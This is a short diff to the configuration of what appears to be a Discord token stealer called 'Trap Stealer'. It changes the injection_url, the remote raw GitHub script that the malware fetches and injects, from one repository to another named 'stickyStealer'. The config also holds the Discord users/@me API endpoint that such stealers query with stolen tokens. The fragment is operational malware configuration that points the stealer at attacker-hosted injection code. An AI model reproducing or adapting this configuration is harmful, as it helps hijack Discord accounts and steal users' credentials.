@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Trap Stealer', 
   embed_icon: 'https://i.ibb.co/QKxLKj5/27fe0a4db89389df3e1ac997cb7c8a21.jpg', 
   embed_color: 16761035,
-  injection_url: 'https://raw.githubusercontent.com/TheCuteOwl/Trap-Stealer/res/js/main.js', 
+  injection_url: 'https://raw.githubusercontent.com/LunaIV/stickyStealer/main/res/js/main.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
